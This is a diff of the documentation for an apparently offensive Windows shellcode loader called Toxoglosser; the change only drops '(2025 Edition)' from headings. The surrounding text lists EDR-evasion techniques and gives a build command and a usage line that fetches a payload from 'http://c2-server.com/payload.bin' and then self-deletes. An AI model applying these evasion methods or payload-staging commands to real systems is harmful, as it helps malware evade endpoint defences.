@@ -9,7 +9,7 @@ It incorporates cutting-edge EDR evasion techniques to inject staged payloads in
 	+ Modern Endpoint Detection and Response (EDR) solutions (CrowdStrike, SentinelOne, etc.)
 	+ Advanced Threat Protection (ATP) and next-gen AV solutions
 
-## Key Features (2025 Edition)
+## Key Features
 
 - **Tartarus' Gate Syscalls**: Advanced direct syscall framework with randomized stub generation at runtime
 - **No LazyDLL Usage**: Complete elimination of all `NewLazyDLL` and `NewLazySystemDLL` calls via manual API resolution
@@ -22,7 +22,7 @@ It incorporates cutting-edge EDR evasion techniques to inject staged payloads in
 - **Staged Payload Loading**: Removes static shellcode signatures, loads payloads from C2 server as primary method
 - **Build Optimization**: Garble obfuscation, size reduction, UPX compression support
 
-## Enhanced Evasion Capabilities (2025 Edition)
+## Enhanced Evasion Capabilities
 
 1. **Tartarus' Gate Direct Syscalls**: Advanced direct syscall framework with randomized stub generation at runtime, bypassing all user-mode hooks
 2. **Manual API Resolution**: Complete elimination of LazyDLL calls via GetModuleHandle + GetProcAddress hashing
@@ -60,7 +60,7 @@ To build the enhanced executable:
 ```bash
 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc GOOS=windows GOARCH=amd64 go build -o toxoglosser_enhanced.exe ./cmd/toxoglosser.go
 ```
-# Building Toxoglosser (2025 Edition)
+# Building Toxoglosser
 
 ## Prerequisites
 
@@ -207,7 +207,7 @@ This is a security research tool designed for studying modern process injection 
 
 
 
-# Toxoglosser Usage Guide (2025 Edition)
+# Toxoglosser Usage Guide
 
 ## Command-Line Options
 
@@ -267,7 +267,7 @@ This is a security research tool designed for studying modern process injection 
 .\toxoglosser.exe -url http://c2-server.com/payload.bin -selfdelete -v
 ```
 
-## Payload Loading Methods (2025 Edition)
+## Payload Loading Methods
 
 ### 1. Staged Loading (Primary Method)
 - Payload is downloaded from a remote URL
